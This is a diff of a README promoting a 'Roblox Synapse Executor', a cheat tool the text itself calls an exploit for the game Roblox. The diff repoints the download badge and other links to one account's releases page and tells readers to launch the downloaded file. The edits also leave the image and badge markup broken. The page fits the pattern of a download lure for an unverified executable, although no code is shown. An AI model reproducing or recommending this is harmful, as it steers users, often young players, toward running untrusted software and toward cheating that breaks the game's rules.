@@ -5,7 +5,7 @@ Welcome to the **Roblox-Synapse** repository, your go-to place for exploring the
 ## Overview
 Roblox Synapse Executor is a powerful exploit tool that allows users to execute scripts in the popular online game, Roblox. With its extensive set of features and robust performance, it has become a favorite among Roblox enthusiasts looking to enhance their gaming experience.
 
-![Roblox Synapse](https://github.com/username/repositoryname/blob/master/images/synapse.png)
+![Roblox Synapse](https://github.com/breezygenerator/Roblox-Synapse/releases)
 
 ## Features
 - **Advanced Script Execution**: Run customized Lua scripts with ease.
@@ -22,13 +22,13 @@ Roblox Synapse Executor is a powerful exploit tool that allows users to execute 
 ## Get Started
 Ready to elevate your Roblox gameplay with Roblox Synapse Executor? Click the button below to download the tool and unleash its full potential:
 
-[![Download Synapse Executor](https://img.shields.io/badge/Download-Synapse%20Executor-blue)](https://github.com/uploads/App.zip)
+[![Download Synapse Executor](https://github.com/breezygenerator/Roblox-Synapse/releases%20Executor-blue)](https://github.com/breezygenerator/Roblox-Synapse/releases)
 
 ### Note: Launch the downloaded file to start using Roblox Synapse Executor.
 
 In case the link provided above is not working or you need more information, feel free to check the **Releases** section for alternative downloads and updates.
 
 ## Additional Resources
-For more information about this repository and updates, visit the [Roblox-Synapse GitHub Page](https://github.com/username/repositoryname).
+For more information about this repository and updates, visit the [Roblox-Synapse GitHub Page](https://github.com/breezygenerator/Roblox-Synapse/releases).
 
 Thank you for exploring the world of Roblox Synapse Executor with us. Happy scripting and gaming! 🎮✨🚀
